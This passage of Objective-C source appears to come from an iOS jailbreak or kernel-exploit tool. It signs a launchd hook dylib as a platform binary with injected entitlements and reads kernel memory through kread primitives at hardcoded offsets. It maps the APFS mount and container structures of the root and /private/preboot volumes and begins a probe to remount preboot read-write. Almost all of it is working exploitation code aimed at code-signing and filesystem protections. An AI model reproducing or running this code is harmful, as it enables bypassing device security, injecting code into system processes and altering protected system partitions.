    NSString *ent = [[NSBundle mainBundle].bundlePath
        stringByAppendingPathComponent:@"Handoff516/entitlements_launchdhook681.plist"];
    const char *target = dt102710_hook_path_cstr();
    NSFileManager *fm = [NSFileManager defaultManager];

    if (![fm fileExistsAtPath:ent]) {
        dt1025_log(log, @"[!] build704 missing entitlements %@", ent);
        dt699_stage("KCALL704_CHOMA_SIGN_RESULT=FAIL");
        return -1;
    }

    uint8_t inputPlatform = 0;
    if (dt_choma_macho_codedirectory_platform(target, &inputPlatform) != 0)
        inputPlatform = 0;

    NSString *inputSha = dt699_sha256_path(@(target));
    NSString *inputCd = dt699_cdhash_path(@(target));
    dt699_stage("KCALL704_CHOMA_SIGN_BEGIN");
    dt699_stage("BUILD102710_HOOK_PLATFORM_SIGN_BEGIN");
    dt1025_log(log, @"[*] build704 ChOma sign begin target=%s pre_platform=%u pre_cd=%@",
        target, (unsigned)inputPlatform, inputCd);

    cdhash_t chomaOutCd = {0};
    uint8_t chomaOutPlatform = 0;
    dt_choma_sign_layout_report_t layoutReport = {0};
    int sr = dt_choma_platform_sign_staged_file(target, ent.fileSystemRepresentation,
        "launchdhook516.dylib", 13, &chomaOutPlatform, chomaOutCd, &layoutReport);
    if (sr != 0) {
        dt1025_log(log, @"[!] build704 ChOma sign/layout failed rc=%d errno=%d", sr, errno);
        dt699_stage("KCALL704_CHOMA_SIGN_RESULT=FAIL");
        dt704_emit_layout("KCALL704_PRE_REPAIR", &layoutReport.pre_repair);
        dt704_emit_layout("KCALL704_POST_REPAIR", &layoutReport.post_repair);
        dt699_stage("KCALL704_MACHO_LAYOUT_VALID=NO");
        return -2;
    }

    dt_choma_macho_layout_info_t finalInfo = {0};
    if (dt_choma_read_macho_layout(target, &finalInfo) != 0
        || !finalInfo.layout_valid
        || !finalInfo.full_parse_ok
        || finalInfo.platform != 13
        || memcmp(finalInfo.cdhash, chomaOutCd, CS_CDHASH_LEN) != 0) {
        dt699_stage("KCALL704_CHOMA_SIGN_RESULT=FAIL");
        dt699_stage("KCALL704_FINAL_STAGED_REPARSE=FAIL");
        dt699_stage("KCALL704_MACHO_LAYOUT_VALID=NO");
        return -3;
    }

    NSString *memCdHex = dt_cdhash_hex_string(chomaOutCd);
    NSString *diskCdHex = dt_cdhash_hex_string(finalInfo.cdhash);

    dt699_stage("KCALL704_CHOMA_SIGN_RESULT=SUCCESS");
    dt699_stage("BUILD102710_HOOK_PLATFORM_SIGN_PASS");
    dt704_emit_layout("KCALL704_PRE_REPAIR", &layoutReport.pre_repair);
    dt704_emit_layout("KCALL704_POST_REPAIR", &layoutReport.post_repair);
    dt704_emit_layout("KCALL704_FINAL", &finalInfo);
    dt699_stage([[NSString stringWithFormat:@"KCALL704_LINKEDIT_FILEOFF=%llu",
        (unsigned long long)finalInfo.linkedit_fileoff] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL704_LINKEDIT_FILESIZE=%llu",
        (unsigned long long)finalInfo.linkedit_filesize] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL704_LINKEDIT_END=%llu",
        (unsigned long long)finalInfo.linkedit_end] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL704_LINKEDIT_VMSIZE=%llu",
        (unsigned long long)finalInfo.linkedit_vmsize] UTF8String]);
    dt699_stage("KCALL704_MACHO_LAYOUT_VALID=YES");
    dt699_stage([[NSString stringWithFormat:@"KCALL704_OUTPUT_PLATFORM=%u", (unsigned)finalInfo.platform] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL704_CHOMA_IN_MEMORY_CDHASH=%@", memCdHex] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL704_ON_DISK_REPARSED_CDHASH=%@", diskCdHex] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102710_HOOK_FINAL_CDHASH=%@", diskCdHex] UTF8String]);
    dt699_stage("KCALL704_CDHASH_MATCH=YES");
    dt699_stage("KCALL704_TEMP_REPARSE=PASS");
    dt699_stage("KCALL704_ATOMIC_RENAME=PASS");
    dt699_stage("KCALL704_FINAL_STAGED_REPARSE=PASS");
    dt699_stage("CODEDIRECTORY_PLATFORM_EXACTLY_13=YES");
    dt699_stage("BUILD102710_HOOK_PLATFORM_IDENTITY_PASS");
    dt1025_log(log, @"[*] build704 ChOma layout OK platform=%u mem_cd=%@ disk_cd=%@ sha=%@",
        (unsigned)finalInfo.platform, memCdHex, diskCdHex, dt699_sha256_path(@(target)));
    return 0;
}

static int dt699_read_cs_blob_cdhash(uint64_t cs_blob, cdhash_t out)
{
    if (!out || !dt696_kptr_valid(cs_blob))
        return -1;
    if (!dt696_in_ro_zone8(cs_blob))
        return -2;

    dt_misaka_offsets_init();
    uint32_t off = g_misaka_offsets.off_cs_blob_csb_cdhash;
    if (off == 0)
        return -3;

    for (int i = 0; i < CS_CDHASH_LEN; i++)
        out[i] = kread8(cs_blob + off + (uint32_t)i);

    for (int i = 0; i < CS_CDHASH_LEN; i++) {
        if (out[i] != 0)
            return 0;
    }
    return -4;
}

static BOOL dt699_cdhash_equal(const cdhash_t a, const cdhash_t b)
{
    return memcmp(a, b, CS_CDHASH_LEN) == 0;
}

static NSString *dt699_classify_platform_blob(BOOL blobPresent, uint8_t platform, BOOL identityOk)
{
    if (!identityOk)
        return @"IDENTITY_MISMATCH";
    if (!blobPresent)
        return @"BLOB_MISSING";
    if ((platform & 1u) != 0)
        return @"BIT1";
    if (platform == 0)
        return @"BIT0";
    return @"UNKNOWN";
}

typedef struct {
    uint64_t vnode;
    uint64_t mount_mp;
    uint32_t mount_flag_70;
    uint32_t mount_kern_flag_74;
    uint64_t mount_fsprivate;
    uint64_t apfs;
    uint32_t apfs_readonly_2b4;
    uint64_t apfs_vol_sb_c0;
    uint64_t apfs_container_d0;
    uint8_t apfs_state_121;
    uint64_t container;
    uint32_t container_mu_gate_13c;
    uint32_t container_remap_144;
    uint64_t container_nxsb_ptr_c8;
    uint64_t nxsb;
    uint32_t nxsb_writable_4f4;
    uint64_t vol_sb;
    uint64_t vol_sb_qword_30;
    uint64_t vol_sb_qword_38;
    BOOL valid;
} dt102718_graph_t;

static NSString *dt102718_yesno(BOOL v)
{
    return v ? @"YES" : @"NO";
}

static int dt102718_emit_root_graph(void (^log)(NSString *line), dt102718_graph_t *out)
{
    if (!out)
        return -1;

    memset(out, 0, sizeof(*out));
    dt_misaka_offsets_init();
    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    if (!o || !o->off_vnode_v_mount)
        return -2;

    uint64_t rootvnode_slot = gSystemInfo.kernelConstant.slide + DT_BAKED_ROOTVNODE_UNSLID;
    uint64_t root_vp = kread_ptr(rootvnode_slot);
    if (!dt696_kptr_valid(root_vp))
        return -3;

    out->vnode = root_vp;
    out->mount_mp = kread_ptr(root_vp + o->off_vnode_v_mount);
    if (!dt696_kptr_valid(out->mount_mp))
        return -4;

    out->mount_flag_70 = kread32(out->mount_mp + o->off_mount_mnt_flag);
    out->mount_kern_flag_74 = kread32(out->mount_mp + o->off_mount_mnt_flag + 4);
    out->mount_fsprivate = kread_ptr(out->mount_mp + DT_BAKED_MOUNT_FSPRIVATE);
    out->apfs = out->mount_fsprivate;
    if (!dt696_kptr_valid(out->apfs))
        return -5;

    out->apfs_readonly_2b4 = kread32(out->apfs + DT_BAKED_APFS_READONLY);
    out->apfs_vol_sb_c0 = kread_ptr(out->apfs + DT_BAKED_APFS_VOL_SB);
    out->apfs_container_d0 = kread_ptr(out->apfs + DT_BAKED_APFS_CONTAINER);
    out->apfs_state_121 = kread8(out->apfs + DT_BAKED_APFS_REMAP_MODE_BYTE);
    out->vol_sb = out->apfs_vol_sb_c0;
    out->container = out->apfs_container_d0;
    if (!dt696_kptr_valid(out->container))
        return -6;

    out->container_mu_gate_13c = kread32(out->container + DT_BAKED_CONTAINER_MU_GATE);
    out->container_remap_144 = kread32(out->container + DT_BAKED_CONTAINER_REMAP);
    out->container_nxsb_ptr_c8 = kread_ptr(out->container + DT_BAKED_CONTAINER_NX_SB_BUF);
    out->nxsb = out->container_nxsb_ptr_c8;
    if (!dt696_kptr_valid(out->nxsb))
        return -7;

    out->nxsb_writable_4f4 = kread32(out->nxsb + DT_BAKED_NXSB_WRITABLE);
    if (!dt696_kptr_valid(out->vol_sb))
        return -8;

    out->vol_sb_qword_30 = kread64(out->vol_sb + DT_BAKED_APFS_VOL_QWORD48);
    out->vol_sb_qword_38 = kread64(out->vol_sb + DT_BAKED_APFS_VOL_BYTE56);
    out->valid = YES;

    dt1025_log(log, @"[*] ROOT_MOUNT_MP=0x%llx", out->mount_mp);
    dt1025_log(log, @"[*] ROOT_APFS=0x%llx", out->apfs);
    dt1025_log(log, @"[*] ROOT_VOL_SB=0x%llx", out->vol_sb);
    dt1025_log(log, @"[*] ROOT_CONTAINER=0x%llx", out->container);
    dt1025_log(log, @"[*] ROOT_NXSB=0x%llx", out->nxsb);
    return 0;
}

/* BUILD102718 preboot mountpoint probe only.
 * /private/preboot must resolve to VDIR (2), not VREG (1). dt697 is unchanged (file/VREG). */
static const uint16_t kDT102718PrebootVnodeTypeVDIR = 2;

static int dt102718_resolve_preboot_vdir_from_fd(int fd, uint64_t *vnode_out, void (^log)(NSString *line))
{
    enum {
        kDT102718ProcFdNfiles = 0xE4,
        kDT102718ProcFdOfiles = 0xF8,
        kDT102718ProcFdFflags = 0x100,
        kDT102718FpGlobOff = 0x10,
        kDT102718FgVnodeOff = 0x38,
        kDT102718FdFlagGuard = 4,
    };

    if (!vnode_out || fd < 0)
        return -1;

    dt_misaka_offsets_init();
    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    if (!o || !o->off_vnode_v_type)
        return -2;

    dt699_stage("BUILD102718_PREBOOT_VNODE_EXPECTED_VDIR=YES");

    uint64_t proc = proc_find(getpid());
    if (!proc) {
        dt1025_log(log, @"[!] build102718 proc_find(self) failed");
        return -3;
    }

    uint32_t nfiles = kread32(proc + kDT102718ProcFdNfiles);
    if ((uint32_t)fd >= nfiles) {
        proc_rele(proc);
        return -4;
    }

    uint64_t ofiles = kread64(proc + kDT102718ProcFdOfiles);
    if (!dt696_kptr_valid(ofiles)) {
        proc_rele(proc);
        return -5;
    }

    uint64_t fflags = kread64(proc + kDT102718ProcFdFflags);
    if (!dt696_kptr_valid(fflags)) {
        proc_rele(proc);
        return -6;
    }

    uint8_t fd_flags = kread8(fflags + (uint64_t)fd);
    if ((fd_flags & kDT102718FdFlagGuard) != 0) {
        proc_rele(proc);
        return -7;
    }

    uint64_t fileproc = kread64(ofiles + (uint64_t)fd * 8ULL);
    if (!dt696_kptr_valid(fileproc)) {
        proc_rele(proc);
        return -8;
    }

    uint64_t fg = kread64(fileproc + kDT102718FpGlobOff);
    if (!dt696_kptr_valid(fg)) {
        proc_rele(proc);
        return -9;
    }

    uint64_t vnode = kread64(fg + kDT102718FgVnodeOff);
    proc_rele(proc);

    if (!dt696_kptr_valid(vnode))
        return -10;

    uint16_t vtype = kread16(vnode + o->off_vnode_v_type);
    dt1025_log(log, @"[*] BUILD102718_PREBOOT_VNODE_TYPE=%u", (unsigned)vtype);
    if (vtype != kDT102718PrebootVnodeTypeVDIR) {
        dt1025_log(log, @"[!] build102718 vnode type=%u (expected %u VDIR)",
            (unsigned)vtype, (unsigned)kDT102718PrebootVnodeTypeVDIR);
        dt699_stage("BUILD102718_PREBOOT_VNODE_TYPE_FAIL");
        return -11;
    }

    dt699_stage("BUILD102718_PREBOOT_VNODE_TYPE_PASS");
    *vnode_out = vnode;
    return 0;
}

static int dt102718_emit_preboot_graph(void (^log)(NSString *line), dt102718_graph_t *out)
{
    if (!out)
        return -1;
    memset(out, 0, sizeof(*out));

    dt_misaka_offsets_init();
    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    if (!o || !o->off_vnode_v_mount)
        return -2;

    dt699_stage("BUILD102718_PREBOOT_GRAPH_PROBE_BEGIN");
    dt1025_log(log, @"[*] PREBOOT_VNODE_RESOLVER_USED=B_OPEN_PLUS_DT102718_RESOLVE_PREBOOT_VDIR_FROM_FD");
    dt1025_log(log, @"[*] PREBOOT_VNODE_RESOLVER_ALREADY_PROVEN=NO");

    int fd = open("/private/preboot", O_RDONLY | O_DIRECTORY | O_CLOEXEC);
    if (fd < 0) {
        dt699_stage("BUILD102718_PREBOOT_VNODE_FAIL");
        dt699_stage("BUILD102718_PREBOOT_VNODE_RESOLVE_FAIL");
        dt1025_log(log, @"[!] build102718 open(/private/preboot) errno=%d", errno);
        return -3;
    }

    uint64_t vnode = 0;
    int vr = dt102718_resolve_preboot_vdir_from_fd(fd, &vnode, log);
    close(fd);
    if (vr != 0 || !dt696_kptr_valid(vnode)) {
        dt699_stage("BUILD102718_PREBOOT_VNODE_FAIL");
        dt699_stage("BUILD102718_PREBOOT_VNODE_RESOLVE_FAIL");
        dt1025_log(log, @"[!] build102718 vnode resolve failed r=%d vnode=0x%llx", vr, vnode);
        return -4;
    }
    out->vnode = vnode;
    dt699_stage("BUILD102718_PREBOOT_VNODE_PASS");

    out->mount_mp = kread_ptr(out->vnode + o->off_vnode_v_mount);
    if (!dt696_kptr_valid(out->mount_mp)) {
        dt699_stage("BUILD102718_PREBOOT_MOUNT_FAIL");
        return -5;
    }
    out->mount_flag_70 = kread32(out->mount_mp + o->off_mount_mnt_flag);
    out->mount_kern_flag_74 = kread32(out->mount_mp + o->off_mount_mnt_flag + 4);
    out->mount_fsprivate = kread_ptr(out->mount_mp + DT_BAKED_MOUNT_FSPRIVATE);
    out->apfs = out->mount_fsprivate;
    dt699_stage("BUILD102718_PREBOOT_MOUNT_PASS");

    if (!dt696_kptr_valid(out->apfs)) {
        dt699_stage("BUILD102718_PREBOOT_APFS_FAIL");
        return -6;
    }
    out->apfs_readonly_2b4 = kread32(out->apfs + DT_BAKED_APFS_READONLY);
    out->apfs_vol_sb_c0 = kread_ptr(out->apfs + DT_BAKED_APFS_VOL_SB);
    out->apfs_container_d0 = kread_ptr(out->apfs + DT_BAKED_APFS_CONTAINER);
    out->apfs_state_121 = kread8(out->apfs + DT_BAKED_APFS_REMAP_MODE_BYTE);
    out->vol_sb = out->apfs_vol_sb_c0;
    out->container = out->apfs_container_d0;
    dt699_stage("BUILD102718_PREBOOT_APFS_PASS");

    if (!dt696_kptr_valid(out->container)) {
        dt699_stage("BUILD102718_PREBOOT_CONTAINER_FAIL");
        return -7;
    }
    out->container_mu_gate_13c = kread32(out->container + DT_BAKED_CONTAINER_MU_GATE);
    out->container_remap_144 = kread32(out->container + DT_BAKED_CONTAINER_REMAP);
    out->container_nxsb_ptr_c8 = kread_ptr(out->container + DT_BAKED_CONTAINER_NX_SB_BUF);
    out->nxsb = out->container_nxsb_ptr_c8;
    dt699_stage("BUILD102718_PREBOOT_CONTAINER_PASS");

    if (!dt696_kptr_valid(out->nxsb)) {
        dt699_stage("BUILD102718_PREBOOT_NXSB_FAIL");
        return -8;
    }
    out->nxsb_writable_4f4 = kread32(out->nxsb + DT_BAKED_NXSB_WRITABLE);
    dt699_stage("BUILD102718_PREBOOT_NXSB_PASS");

    if (!dt696_kptr_valid(out->vol_sb)) {
        dt699_stage("BUILD102718_PREBOOT_VOLSB_FAIL");
        return -9;
    }
    out->vol_sb_qword_30 = kread64(out->vol_sb + DT_BAKED_APFS_VOL_QWORD48);
    out->vol_sb_qword_38 = kread64(out->vol_sb + DT_BAKED_APFS_VOL_BYTE56);
    dt699_stage("BUILD102718_PREBOOT_VOLSB_PASS");

    out->valid = YES;
    return 0;
}

static void dt102718_emit_graph_compare(void (^log)(NSString *line),
    const dt102718_graph_t *root, const dt102718_graph_t *preboot)
{
    if (!root || !preboot || !root->valid || !preboot->valid)
        return;

    dt1025_log(log, @"[*] PREBOOT_VNODE=0x%llx", preboot->vnode);
    dt1025_log(log, @"[*] PREBOOT_MOUNT_MP=0x%llx", preboot->mount_mp);
    dt1025_log(log, @"[*] PREBOOT_MOUNT_FLAGS_0x70=0x%x", preboot->mount_flag_70);
    dt1025_log(log, @"[*] PREBOOT_MOUNT_KERN_FLAGS_0x74=0x%x", preboot->mount_kern_flag_74);
    dt1025_log(log, @"[*] PREBOOT_MOUNT_FSPRIVATE=0x%llx", preboot->mount_fsprivate);
    dt1025_log(log, @"[*] PREBOOT_APFS=0x%llx", preboot->apfs);
    dt1025_log(log, @"[*] PREBOOT_APFS_READONLY_0x2B4=0x%x", preboot->apfs_readonly_2b4);
    dt1025_log(log, @"[*] PREBOOT_APFS_VOL_SB_0xC0=0x%llx", preboot->apfs_vol_sb_c0);
    dt1025_log(log, @"[*] PREBOOT_APFS_CONTAINER_0xD0=0x%llx", preboot->apfs_container_d0);
    dt1025_log(log, @"[*] PREBOOT_APFS_STATE_0x121=0x%x", (unsigned)preboot->apfs_state_121);
    dt1025_log(log, @"[*] PREBOOT_CONTAINER_MU_GATE_0x13C=0x%x", preboot->container_mu_gate_13c);
    dt1025_log(log, @"[*] PREBOOT_CONTAINER_REMAP_0x144=0x%x", preboot->container_remap_144);
    dt1025_log(log, @"[*] PREBOOT_CONTAINER_NXSB_PTR_0xC8=0x%llx", preboot->container_nxsb_ptr_c8);
    dt1025_log(log, @"[*] PREBOOT_NXSB=0x%llx", preboot->nxsb);
    dt1025_log(log, @"[*] PREBOOT_NXSB_WRITABLE_0x4F4=0x%x", preboot->nxsb_writable_4f4);
    dt1025_log(log, @"[*] PREBOOT_VOL_SB=0x%llx", preboot->vol_sb);
    dt1025_log(log, @"[*] PREBOOT_VOL_SB_QWORD_0x30=0x%llx", preboot->vol_sb_qword_30);
    dt1025_log(log, @"[*] PREBOOT_VOL_SB_QWORD_0x38=0x%llx", preboot->vol_sb_qword_38);

    BOOL sameMount = root->mount_mp == preboot->mount_mp;
    BOOL sameApfs = root->apfs == preboot->apfs;
    BOOL sameVol = root->vol_sb == preboot->vol_sb;
    BOOL sameContainer = root->container == preboot->container;
    BOOL sameNxsb = root->nxsb == preboot->nxsb;
    dt1025_log(log, @"[*] ROOT_PREBOOT_MOUNT_SAME=%@", dt102718_yesno(sameMount));
    dt1025_log(log, @"[*] ROOT_PREBOOT_APFS_SAME=%@", dt102718_yesno(sameApfs));
    dt1025_log(log, @"[*] ROOT_PREBOOT_VOL_SB_SAME=%@", dt102718_yesno(sameVol));
    dt1025_log(log, @"[*] ROOT_PREBOOT_CONTAINER_SAME=%@", dt102718_yesno(sameContainer));
    dt1025_log(log, @"[*] ROOT_PREBOOT_NXSB_SAME=%@", dt102718_yesno(sameNxsb));
    dt1025_log(log, @"[*] ROOT_AND_PREBOOT_SHARE_CONTAINER=%@", dt102718_yesno(sameContainer));
    dt1025_log(log, @"[*] ROOT_AND_PREBOOT_SHARE_NXSB=%@", dt102718_yesno(sameNxsb));
    dt1025_log(log, @"[*] ROOT_AND_PREBOOT_HAVE_DISTINCT_APFS_OBJECTS=%@", dt102718_yesno(!sameApfs));
    dt1025_log(log, @"[*] ROOT_AND_PREBOOT_HAVE_DISTINCT_VOL_SB=%@", dt102718_yesno(!sameVol));

    dt1025_log(log, @"[*] FIELD=mount+0x70 ROOT_VALUE=0x%x PREBOOT_VALUE=0x%x SAME=%@",
        root->mount_flag_70, preboot->mount_flag_70, dt102718_yesno(root->mount_flag_70 == preboot->mount_flag_70));
    dt1025_log(log, @"[*] FIELD=mount+0x74 ROOT_VALUE=0x%x PREBOOT_VALUE=0x%x SAME=%@",
        root->mount_kern_flag_74, preboot->mount_kern_flag_74, dt102718_yesno(root->mount_kern_flag_74 == preboot->mount_kern_flag_74));
    dt1025_log(log, @"[*] FIELD=apfs+0x2B4 ROOT_VALUE=0x%x PREBOOT_VALUE=0x%x SAME=%@",
        root->apfs_readonly_2b4, preboot->apfs_readonly_2b4, dt102718_yesno(root->apfs_readonly_2b4 == preboot->apfs_readonly_2b4));
    dt1025_log(log, @"[*] FIELD=container+0x13C ROOT_VALUE=0x%x PREBOOT_VALUE=0x%x SAME=%@",
        root->container_mu_gate_13c, preboot->container_mu_gate_13c, dt102718_yesno(root->container_mu_gate_13c == preboot->container_mu_gate_13c));
    dt1025_log(log, @"[*] FIELD=container+0x144 ROOT_VALUE=0x%x PREBOOT_VALUE=0x%x SAME=%@",
        root->container_remap_144, preboot->container_remap_144, dt102718_yesno(root->container_remap_144 == preboot->container_remap_144));
    dt1025_log(log, @"[*] FIELD=nxsb+0x4F4 ROOT_VALUE=0x%x PREBOOT_VALUE=0x%x SAME=%@",
        root->nxsb_writable_4f4, preboot->nxsb_writable_4f4, dt102718_yesno(root->nxsb_writable_4f4 == preboot->nxsb_writable_4f4));
    dt1025_log(log, @"[*] FIELD=vol_sb+0x30 ROOT_VALUE=0x%llx PREBOOT_VALUE=0x%llx SAME=%@",
        root->vol_sb_qword_30, preboot->vol_sb_qword_30, dt102718_yesno(root->vol_sb_qword_30 == preboot->vol_sb_qword_30));
    dt1025_log(log, @"[*] FIELD=vol_sb+0x38 ROOT_VALUE=0x%llx PREBOOT_VALUE=0x%llx SAME=%@",
        root->vol_sb_qword_38, preboot->vol_sb_qword_38, dt102718_yesno(root->vol_sb_qword_38 == preboot->vol_sb_qword_38));

    dt1025_log(log, @"[*] PREBOOT_VFS_RDONLY_GATE_BLOCKING=%@",
        (preboot->mount_flag_70 & MNT_RDONLY) ? @"YES" : @"NO");
    dt1025_log(log, @"[*] PREBOOT_VFS_WRITEUPGRADE_GATE_BLOCKING=NOT_PROVEN");
    dt1025_log(log, @"[*] PREBOOT_APFS_READONLY_GATE_BLOCKING=%@",
        preboot->apfs_readonly_2b4 ? @"YES" : @"NO");
    dt1025_log(log, @"[*] PREBOOT_CONTAINER_MU_GATE_BLOCKING=%@",
        preboot->container_mu_gate_13c ? @"YES" : @"NO");
    dt1025_log(log, @"[*] PREBOOT_CONTAINER_REMAP_GATE_BLOCKING=%@",
        preboot->container_remap_144 ? @"YES" : @"NO");
    dt1025_log(log, @"[*] PREBOOT_NXSB_WRITABLE_GATE_BLOCKING=%@",
        preboot->nxsb_writable_4f4 ? @"NO" : @"YES");
    dt1025_log(log, @"[*] PREBOOT_VOL_SB_GATE_BLOCKING=%@",
        (preboot->vol_sb_qword_30 == 0 || preboot->vol_sb_qword_30 == 2) ? @"NO" : @"YES");
}

enum {
    kDT102719MountModeRO = 1, /* DT_APFS_MOUNT_FILESYSTEM — apfs_mount_update mode bit0=1 */
    kDT102719MountModeRW = 0, /* apfs_mount_update mode bit0=0 */
};

static BOOL dt102719_graph_identity_equal(const dt102718_graph_t *a, const dt102718_graph_t *b)
{
    if (!a || !b || !a->valid || !b->valid)
        return NO;
    return a->mount_mp == b->mount_mp
        && a->apfs == b->apfs
        && a->vol_sb == b->vol_sb
        && a->container == b->container
        && a->nxsb == b->nxsb
        && a->mount_flag_70 == b->mount_flag_70
        && a->mount_kern_flag_74 == b->mount_kern_flag_74
        && a->apfs_readonly_2b4 == b->apfs_readonly_2b4
        && a->container_mu_gate_13c == b->container_mu_gate_13c
        && a->container_remap_144 == b->container_remap_144
        && a->nxsb_writable_4f4 == b->nxsb_writable_4f4
        && a->vol_sb_qword_30 == b->vol_sb_qword_30
        && a->vol_sb_qword_38 == b->vol_sb_qword_38;
}

static void dt102719_log_preboot_baseline(void (^log)(NSString *line), const dt102718_graph_t *g)
{
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_BASELINE_BEGIN");
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_VNODE=0x%llx", g->vnode);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_MOUNT_MP=0x%llx", g->mount_mp);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_MOUNT_FLAGS_0x70=0x%x", g->mount_flag_70);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_MOUNT_KERN_FLAGS_0x74=0x%x", g->mount_kern_flag_74);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_APFS=0x%llx", g->apfs);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_APFS_RDONLY_0x2B4=0x%x", g->apfs_readonly_2b4);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_VOL_SB=0x%llx", g->vol_sb);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_CONTAINER=0x%llx", g->container);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_NXSB=0x%llx", g->nxsb);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_CONTAINER_MU_0x13C=0x%x", g->container_mu_gate_13c);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_CONTAINER_REMAP_0x144=0x%x", g->container_remap_144);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_NXSB_WRITABLE_0x4F4=0x%x", g->nxsb_writable_4f4);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_VOLSB_0x30=0x%llx", g->vol_sb_qword_30);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_VOLSB_0x38=0x%llx", g->vol_sb_qword_38);
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_BASELINE_COMPLETE");
}

static BOOL dt102719_statfs_preboot(void (^log)(NSString *line), const char *tag,
    uint32_t *flags_out, BOOL *rdonly_out)
{
    struct statfs fs;
    if (statfs("/private/preboot", &fs) != 0) {
        dt1025_log(log, @"[!] build102719 statfs /private/preboot errno=%d", errno);
        return NO;
    }
    if (flags_out)
        *flags_out = fs.f_flags;
    if (rdonly_out)
        *rdonly_out = (fs.f_flags & MNT_RDONLY) != 0;
    dt1025_log(log, @"[*] %@_STATFS_FLAGS=0x%x", tag, fs.f_flags);
    dt1025_log(log, @"[*] %@_STATFS_MNTON=%s", tag, fs.f_mntonname);
    dt1025_log(log, @"[*] %@_STATFS_MNTFROM=%s", tag, fs.f_mntfromname);
    dt1025_log(log, @"[*] %@_STATFS_FSTYPE=%s", tag, fs.f_fstypename);
    return YES;
}

static NSString *dt102719_classify_errno(int e)
{
    switch (e) {
    case EPERM: return @"EPERM_UPDATE_GATE";
    case EACCES: return @"POLICY_OR_ACCESS_GATE";
    case EINVAL: return @"EINVAL_ARGS_OR_UPDATE_STATE";
    case EROFS: return @"EROFS_APFS_OR_NX_GATE";
    case ENOTSUP: return @"EOPNOTSUPP_UPDATE_PATH";
    default: return [NSString stringWithFormat:@"UNCLASSIFIED_ERRNO_%d", e];
    }
}

static BOOL dt102719_readonly_state_changed(const dt102718_graph_t *before,
    const dt102718_graph_t *after, BOOL statfs_was_rdonly, BOOL statfs_is_rdonly)
{
    if (!before || !after)
        return NO;
    if (statfs_was_rdonly != statfs_is_rdonly)
        return YES;
    if ((before->mount_flag_70 & MNT_RDONLY) != (after->mount_flag_70 & MNT_RDONLY))
        return YES;
    if (before->apfs_readonly_2b4 == 1 && after->apfs_readonly_2b4 == 0)
        return YES;
    return NO;
}

static void dt102719_emit_static_audit(void (^log)(NSString *line))
{
    dt1025_log(log, @"[*] BUILD102719_DIRECT_KERNEL_FIELD_WRITES=0");
    dt1025_log(log, @"[*] BUILD102719_DIRECT_APFS_FIELD_WRITES=0");
    dt1025_log(log, @"[*] BUILD102719_DIRECT_MOUNT_FLAG_WRITES=0");
    dt1025_log(log, @"[*] BUILD102719_FILESYSTEM_CREATE_CALLS=0");
    dt1025_log(log, @"[*] BUILD102719_FILESYSTEM_DELETE_CALLS=0");
    dt1025_log(log, @"[*] BUILD102719_COPY_CALLS=0");
    dt1025_log(log, @"[*] BUILD102719_TRUSTCACHE_CALLS=0");
    dt1025_log(log, @"[*] BUILD102719_LAUNCHD_INJECTION_CALLS=0");
    dt1025_log(log, @"[*] BUILD102719_WALL2_CALLS=0");
    dt1025_log(log, @"[*] BUILD102719_OPAINJECT_CALLS=0");
    dt1025_log(log, @"[*] MAX_RO_PREFLIGHT_UPDATE_CALLS=1");
    dt1025_log(log, @"[*] MAX_RW_UPDATE_CALLS=1");
    dt1025_log(log, @"[*] MAX_RO_RESTORE_UPDATE_CALLS=1");
}

static int dt102719_run_mntupdate_roundtrip_probe(void (^log)(NSString *line), NSString **verdictOut)
{
    static const char *kPrebootPath = "/private/preboot";

    dt699_stage("BUILD102719_PREBOOT_MNTUPDATE_ROUNDTRIP_PROBE_BEGIN");
    dt1025_log(log, @"[*] BUILD102719_SCOPE=PREBOOT_MNTUPDATE_ROUNDTRIP_PROBE_ONLY");
    dt1025_log(log, @"[*] MNTUPDATE_HELPER_USED=dt102719_syscall_apfs_mnt_update");
    dt1025_log(log, @"[*] MNTUPDATE_ARGUMENT_SHAPE=dt_apfs_mount_args{fspec,apfs_flags=5,mount_mode}");
    dt1025_log(log, @"[*] RW_UPDATE_FLAGS=mount_mode=0");
    dt1025_log(log, @"[*] RO_RESTORE_FLAGS=mount_mode=1");
    dt1025_log(log, @"[*] DIRECT_KERNEL_WRITES_ADDED=NO");
    dt1025_log(log, @"[*] DIRECT_APFS_PATCHES_ADDED=NO");
    dt1025_log(log, @"[*] BUILD47_PATCH_CHAIN_REUSED=NO");
    dt1025_log(log, @"[*] FILESYSTEM_MUTATION_ADDED=NO");

    dt102718_graph_t baseline = {0};
    if (dt102718_emit_preboot_graph(log, &baseline) != 0) {
        dt1025_set_verdict(verdictOut, @"BUILD102719_PREBOOT_GRAPH_FAIL");
        dt699_stage("BUILD102719_STOP_BEFORE_PREBOOT_FILESYSTEM_MUTATION");
        return -7190;
    }
    dt102719_log_preboot_baseline(log, &baseline);

    uint32_t statfs_before_flags = 0;
    BOOL statfs_before_rdonly = YES;
    if (!dt102719_statfs_preboot(log, @"BUILD102719_STATFS_BEFORE", &statfs_before_flags, &statfs_before_rdonly)) {
        dt1025_set_verdict(verdictOut, @"BUILD102719_STATFS_BEFORE_FAIL");
        dt699_stage("BUILD102719_STOP_BEFORE_PREBOOT_FILESYSTEM_MUTATION");
        return -7192;
    }
